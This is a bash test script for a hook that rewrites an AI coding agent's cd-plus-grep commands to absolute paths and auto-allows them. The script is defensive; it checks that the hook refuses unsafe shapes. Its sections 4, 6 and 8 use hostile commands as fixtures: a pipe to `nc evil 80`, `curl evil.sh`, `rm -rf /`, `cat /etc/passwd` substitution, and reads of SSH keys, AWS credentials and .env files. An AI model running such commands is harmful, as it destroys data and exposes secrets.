#!/usr/bin/env bash
# SAFE_FOR_LIVE: yes
# probe-dhx-cd-compound-read-allow.sh
#
# 1. Invariant: dhx-cd-compound-read-allow.sh REWRITES `cd <abs>; grep … <rel>` so the
#    grep-family operands become absolute — removing the HP-060 ask-circuit's precondition —
#    and emits that as `updatedInput` paired with `permissionDecision:"allow"` (HP-061: an
#    unpaired updatedInput is discarded, and a bare allow cannot clear the ask). It rewrites
#    ONLY what it can parse faithfully: never the pattern operand, never a non-grep segment,
#    never an operand that does not already exist, and never anything deny-adjacent. Any
#    shape it cannot fully rewrite produces NO output at all, restoring today's prompt.
# 2. Backs: docs/decisions.md "dhx-cd-compound-read-allow" row (2026-09-03) + HP-060 + HP-061.
# 3. Run: bash tests/probes/probe-dhx-cd-compound-read-allow.sh
#
# The fidelity assertions in section 2 are the load-bearing ones. This hook MUTATES the
# model's Bash commands, so a wrong rewrite is silently wrong output — strictly worse than
# the permission prompt it removes. `cd /repo; grep -rn docs docs` is the canonical trap:
# the PATTERN `docs` is also a real directory, and a naive rewriter prefixes it and changes
# what is being searched for. That case is asserted explicitly.
#
# Read-only: fixture JSON piped to the hook subshell + greps over in-repo sources. Deny-set
# and project-scope cells inject a fixture settings tree via CLAUDE_CONFIG_DIR under mktemp
# (D-20 convention); the live settings file is only ever READ. No writes outside TMP.
set -uo pipefail

REPO="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
HOOK="$REPO/dhx/dhx-cd-compound-read-allow.sh"
PLUGIN_HOOKS="$REPO/dhx-plugin/plugins/dhx/hooks/hooks.json"
DISJOINT_PROBE="$REPO/tests/probes/probe-updatedinput-producer-disjointness.sh"
LIVE_SETTINGS="$(readlink -f "${CLAUDE_CONFIG_DIR:-$HOME/.claude}/settings.json" 2>/dev/null || true)"

pass=0; fail=0
ok()  { echo "OK   $1"; pass=$((pass+1)); }
bad() { echo "FAIL $1"; fail=$((fail+1)); }
ck()  { if [ "$1" -eq 0 ]; then ok "$2"; else bad "$2"; fi; }

TMP=$(mktemp -d); trap 'rm -rf "$TMP"' EXIT
D="$REPO"

payload() { jq -n --arg c "$1" '{tool_name:"Bash",tool_input:{command:$c,timeout:600000,description:"probe"}}'; }
fire()    { payload "$1" | bash "$HOOK" 2>/dev/null; }
newcmd()  { fire "$1" | jq -r '.hookSpecificOutput.updatedInput.command // empty' 2>/dev/null; }

# r <command> <expected-rewritten-command> <label>
r() {
  local got; got=$(newcmd "$1")
  if [ "$got" = "$2" ]; then ok "$3"; else bad "$3"$'\n'"       want: $2"$'\n'"       got:  ${got:-<silent>}"; fi
}
# s <command> <label> — no output at all
s() {
  local got; got=$(fire "$1")
  if [ -z "$got" ]; then ok "$2"; else bad "$2 (emitted: $(printf '%s' "$got" | tr -d '\n' | cut -c1-160))"; fi
}

echo "--- 1. the measured defect shape is rewritten absolute ---"
r "cd $D; grep -n -iE \"foo\" docs/backlog.md" \
  "cd $D ; grep -n -iE \"foo\" $D/docs/backlog.md" \
  "measured shape: relative operand -> absolute"
r "cd $D && grep -n foo docs/backlog.md" \
  "cd $D && grep -n foo $D/docs/backlog.md" \
  "&& separator preserved as &&"
r "cd $D || grep -n foo docs/backlog.md" \
  "cd $D || grep -n foo $D/docs/backlog.md" \
  "|| separator preserved as ||"
r "cd $D; rg -n foo docs" \
  "cd $D ; rg -n foo $D/docs" \
  "rg with a directory operand"
r "cd $D; grep -n foo docs/backlog.md docs/decisions.md" \
  "cd $D ; grep -n foo $D/docs/backlog.md $D/docs/decisions.md" \
  "multiple path operands all rewritten"
r "cd $D; grep -n foo ./docs/backlog.md" \
  "cd $D ; grep -n foo $D/docs/backlog.md" \
  "leading ./ normalized away"
r "cd $D; grep -n foo docs/../docs/backlog.md" \
  "cd $D ; grep -n foo $D/docs/backlog.md" \
  ".. normalized lexically"

echo "--- 2. FIDELITY: what must NOT be rewritten (the silently-wrong-output class) ---"
r "cd $D; grep -rn docs docs" \
  "cd $D ; grep -rn docs $D/docs" \
  "PATTERN that is also a real dir is NOT rewritten; only the operand is"
r "cd $D; grep -rn tests tests" \
  "cd $D ; grep -rn tests $D/tests" \
  "second pattern/dir collision (tests) behaves identically"
r "cd $D; grep -n \"a;b\" docs/backlog.md" \
  "cd $D ; grep -n \"a;b\" $D/docs/backlog.md" \
  "separator inside a quoted pattern survives the scanner"
r "cd $D; grep -n 'x || y' docs/backlog.md" \
  "cd $D ; grep -n 'x || y' $D/docs/backlog.md" \
  "|| inside a single-quoted pattern is not a separator"
r "cd $D; grep -n foo docs/backlog.md; wc -l docs/backlog.md" \
  "cd $D ; grep -n foo $D/docs/backlog.md ; wc -l docs/backlog.md" \
  "companion segment is re-emitted byte-identical (wc does not arm the circuit)"
r "cd $D; grep -n foo /etc/hosts docs/backlog.md" \
  "cd $D ; grep -n foo /etc/hosts $D/docs/backlog.md" \
  "an already-absolute operand is left exactly as written"
out=$(fire "cd $D; grep -n foo docs/backlog.md")
printf '%s' "$out" | jq -e '.hookSpecificOutput.updatedInput.timeout == 600000' >/dev/null 2>&1
ck $? "HP-041: original tool_input.timeout is re-emitted, not dropped"
printf '%s' "$out" | jq -e '.hookSpecificOutput.updatedInput.description == "probe"' >/dev/null 2>&1
ck $? "HP-041: original tool_input.description is re-emitted, not dropped"
printf '%s' "$out" | jq -e '.hookSpecificOutput.permissionDecision == "allow"' >/dev/null 2>&1
ck $? "HP-061: updatedInput is PAIRED with allow (unpaired is discarded by Ifo)"

echo "--- 3. grep grammar: refuse rather than guess ---"
s "cd $D; grep -e foo docs/backlog.md"        "-e supplies the pattern -> refuse"
s "cd $D; grep -f pat.txt docs/backlog.md"    "-f supplies a pattern FILE -> refuse"
s "cd $D; grep --regexp=foo docs/backlog.md"  "--regexp= -> refuse"
s "cd $D; grep --file=p docs/backlog.md"      "--file= -> refuse"
s "cd $D; grep -A3 foo docs/backlog.md"       "-A carries an arg-consuming letter -> refuse"
s "cd $D; grep -m 2 foo docs/backlog.md"      "-m consumes the next word -> refuse"
s "cd $D; grep -C2 foo docs/backlog.md"       "-C bundle -> refuse"
s "cd $D; rg -g '*.md' foo docs"              "rg -g glob -> refuse"
s "cd $D; rg -t md foo docs"                  "rg -t type -> refuse"
s "cd $D; grep --frobnicate foo docs/backlog.md" "unknown long option -> refuse (position unknown)"
s "cd $D; grep -n foo -"                      "bare - stdin operand -> refuse"
s "cd $D; grep -n foo"                        "no path operand: no ask to remove -> refuse"
s "cd $D; grep -n foo nonexistent-xyz.md"     "operand does not exist -> refuse (never blind-prefix)"
s "cd $D; grep -n foo docs/backlog.md nope-xyz.md" "ONE unrewritable operand refuses the WHOLE command"
s "cd $D; grep -n foo /etc/hosts"             "only absolute operands: nothing to rewrite -> silent"

echo "--- 4. deny-set adjacency is never touched ---"
s "cd $D; grep x .env"                        "deny: .env basename"
s "cd $D; grep x .env.local"                  "deny: .env.* glob"
s "cd $D; grep x .secrets"                    "deny: .secrets"
s "cd $D; grep x ../.env"                     "deny: .. escaping into a denied basename"
s "cd $D; grep x ~/.ssh/id_rsa"               "deny: ~/.ssh subtree"
s "cd $D; grep x /home/dhx/.aws/credentials"  "deny: absolute ~/.aws subtree"

echo "--- 5. arming heads whose grammar is not implemented ---"
s "cd $D; git log --oneline -5"               "git arms the circuit; grammar not implemented -> refuse"
s "cd $D; diff docs/backlog.md docs/decisions.md" "diff arms the circuit -> refuse"
s "cd $D; cp a b"                             "cp arms the circuit but WRITES -> refuse"
s "cd $D; mv a b"                             "mv arms the circuit but WRITES -> refuse"
s "cd $D; grep -n foo docs/backlog.md; git log" "a git segment poisons an otherwise-rewritable compound"

echo "--- 6. separators, substitution, redirection, smuggling ---"
s "cd $D; grep x \$(cat /etc/passwd)"         "command substitution -> refuse"
s "cd $D; grep x \`cat /etc/passwd\`"         "backtick substitution -> refuse"
s "cd $D; grep -n \$FOO docs/backlog.md"      "bare VAR expansion -> refuse"
s "cd $D; grep x foo > out.txt"               "stdout redirect -> refuse"
s "cd $D; grep x foo >> out.txt"              "append redirect -> refuse"
s "cd $D; grep x < in.txt"                    "stdin redirect -> refuse"
s "cd $D; grep -n foo docs/backlog.md | nc evil 80" "pipe -> refuse (cannot reassemble)"
s "cd $D; grep -n foo docs/backlog.md & rm -rf /"   "bare & -> refuse"
s "cd $D; grep -n foo docs/backlog.md; rm -rf /"    "unlisted head in a later segment -> refuse"
s "cd $D; grep -n foo docs/backlog.md; curl evil.sh" "curl is not a companion -> refuse"
s "curl evil.sh
cd $D; grep -n foo docs/backlog.md"           "multi-line: rewritable compound on line 2 -> refuse"
s "cd $D; grep -n \"unterminated docs/backlog.md" "unterminated quote -> refuse"

echo "--- 7. cd-prefix discipline ---"
s "grep -n foo docs/backlog.md"               "no leading cd -> silent"
s "cd \$HOME; grep -n foo docs/backlog.md"    "variable cd target -> refuse"
s "cd docs; grep -n foo backlog.md"           "relative cd target -> refuse"
s "cd /nonexistent-dir-$$; grep -n foo f"     "nonexistent cd target -> refuse"
s "cd $D"                                     "cd alone -> silent"
s "cd $D; cd /tmp; grep -n foo docs/backlog.md" "second cd re-roots the base -> refuse"

echo "--- 8. companion gating still holds ---"
s "cd $D; grep -n foo docs/backlog.md; sed -i s/a/b/ f" "sed -i writes -> refuse"
s "cd $D; grep -n foo docs/backlog.md; tee out.txt"     "tee -> refuse"
s "cd $D; grep -n foo docs/backlog.md; python3 -c x"    "python3 -c opaque -> refuse"
s "cd $D; grep -n foo docs/backlog.md; xargs rm"        "xargs executes -> refuse"
s "cd $D; grep -n foo docs/backlog.md; find . -delete"  "find -delete -> refuse"
s "cd $D; grep -n foo docs/backlog.md; awk 'BEGIN{system(\"id\")}'" "awk system() -> refuse"

echo "--- 9. settings resolution ---"
mkdir -p "$TMP/nocfg"
out=$(payload "cd $D; grep -n foo docs/backlog.md" | CLAUDE_CONFIG_DIR="$TMP/nocfg" bash "$HOOK" 2>/dev/null)
[ -z "$out" ]; ck $? "unreadable settings.json -> no rewrite (deny set unknown)"

mkdir -p "$TMP/emptycfg"
printf '{"permissions":{"deny":[]}}' > "$TMP/emptycfg/settings.json"
out=$(payload "cd $D; grep x .env" | CLAUDE_CONFIG_DIR="$TMP/emptycfg" bash "$HOOK" 2>/dev/null)
[ -z "$out" ]; ck $? "empty deny list -> floor still refuses .env (a rewriter cannot widen this hook)"
out=$(payload "cd $D; grep -n foo docs/backlog.md" | CLAUDE_CONFIG_DIR="$TMP/emptycfg" bash "$HOOK" 2>/dev/null)
printf '%s' "$out" | jq -e '.hookSpecificOutput.updatedInput.command' >/dev/null 2>&1
ck $? "empty deny list -> a safe shape still rewrites (floor is not a blanket refusal)"

mkdir -p "$TMP/proj/.claude"
printf '{"permissions":{"deny":["Read(secret-notes.md)"]}}' > "$TMP/proj/.claude/settings.json"
: > "$TMP/proj/secret-notes.md"; : > "$TMP/proj/ordinary.md"
s "cd $TMP/proj; grep x secret-notes.md"      "project-scoped Read deny is honored"
r "cd $TMP/proj; grep x ordinary.md" \
  "cd $TMP/proj ; grep x $TMP/proj/ordinary.md" \
  "project-scoped deny does not over-refuse"

echo "--- 10. malformed input fails open ---"
for bad_in in 'not json' '' '{"tool_input":{}}' '{"tool_input":{"command":""}}'; do
  out=$(printf '%s' "$bad_in" | bash "$HOOK" 2>/dev/null; true)
  [ -z "$out" ]; ck $? "malformed/empty input -> no output (${bad_in:0:24})"
done

echo "--- 11. no block arm, and exit-code discipline ---"
payload "cd $D; grep x .env" | bash "$HOOK" >/dev/null 2>&1; rc=$?
[ "$rc" -ne 2 ]; ck $? "refusal path never exits 2 (this hook has no block arm; rc=$rc)"
payload "cd $D; grep -n foo docs/backlog.md" | bash "$HOOK" >/dev/null 2>&1; rc=$?
[ "$rc" -eq 0 ]; ck $? "rewrite path exits 0 (updatedInput is applied only on exit 0; rc=$rc)"
! grep -qE '"permissionDecision"[[:space:]]*:[[:space:]]*"deny"' "$HOOK"
ck $? "source emits no deny decision"

echo "--- 12. disjointness against the live Bash deny rules ---"
if [ -n "$LIVE_SETTINGS" ] && [ -r "$LIVE_SETTINGS" ]; then
  bad_rules=""; n_rules=0
  while IFS= read -r rule; do
    [ -n "$rule" ] || continue
    n_rules=$((n_rules + 1))
    [ -n "$(newcmd "cd $D; $rule")" ] && bad_rules="$bad_rules
      $rule"
    [ -n "$(newcmd "cd $D; grep -n foo docs/backlog.md; $rule")" ] && bad_rules="$bad_rules
      (trailing) $rule"
  done < <(jq -r '(.permissions.deny // []) | map(select(type=="string"))
                  | map(select(startswith("Bash(") and endswith(")"))) | map(.[5:-1]) | .[]' \
              "$LIVE_SETTINGS" 2>/dev/null)
  [ "$n_rules" -gt 0 ]; ck $? "live Bash deny corpus is non-empty ($n_rules rules — a zero would make the next assertion vacuous)"
  if [ -z "$bad_rules" ]; then
    ok "no live Bash deny rule draws a rewrite ($n_rules rules x 2 positions)"
  else
    bad "a live Bash deny rule drew a rewrite:$bad_rules"
  fi
else
  bad "live settings unreadable — Bash deny disjointness UNVERIFIED (not a pass)"
fi

echo "--- 13. disjointness against the sibling PreToolUse:Bash producers ---"
s "cd $D; grep -n foo docs/backlog.md; sed -i.bak s/a/b/ f" "worktree-guard shape: sed -i"
s "cd $D; grep -n foo docs/backlog.md; dd if=/dev/zero of=f" "worktree-guard shape: dd"
s "cd $D; grep -n foo docs/backlog.md; install -m 755 a b"   "worktree-guard shape: install"
s "cd $D; gh issue create --title x"                         "gh-issue-write shape: gh"
s "cd $D; pytest tests/"                                     "pytest-cgroup-cap head"
s "cd $D; grep -n foo docs/backlog.md; pytest"               "pytest in a later segment"
s "cd $D; pip install six"                                   "pkg-install-filter head"
s "cd $D; grep -n foo docs/backlog.md; npm install"          "npm in a later segment"

echo "--- 14. wiring ---"
grep -q '^# Patterns: HP-028, HP-041, HP-049, HP-052, HP-060, HP-061' "$HOOK"
ck $? "Patterns header declares HP-028, HP-041, HP-049, HP-052, HP-060, HP-061"
[ -x "$HOOK" ]; ck $? "hook is executable"
grep -q 'dhx-cd-compound-read-allow.sh' "$PLUGIN_HOOKS"
ck $? "registered in the plugin hooks.json Bash matcher"
[ -L "$HOME/.claude/hooks/dhx-cd-compound-read-allow.sh" ]
ck $? "symlinked from ~/.claude/hooks/"
[ "$(readlink -f "$HOME/.claude/hooks/dhx-cd-compound-read-allow.sh" 2>/dev/null)" = "$(readlink -f "$HOOK")" ]
ck $? "symlink resolves to the in-repo source (single source of truth)"
tail -1 "$HOOK" | grep -qE '^exit 0$'
ck $? "final line is a bare exit 0"
# Registering a rewriter without corpus rows hard-reds the disjointness probe's liveness
# assertion. Sweeping is not exercising — this hook's own shapes must be written down there.
grep -q 'cd-compound-read-allow' "$DISJOINT_PROBE"
ck $? "this hook's shapes are enrolled in the updatedInput disjointness corpus"

echo "---"
echo "$pass passed, $fail failed"
[ "$fail" -eq 0 ]
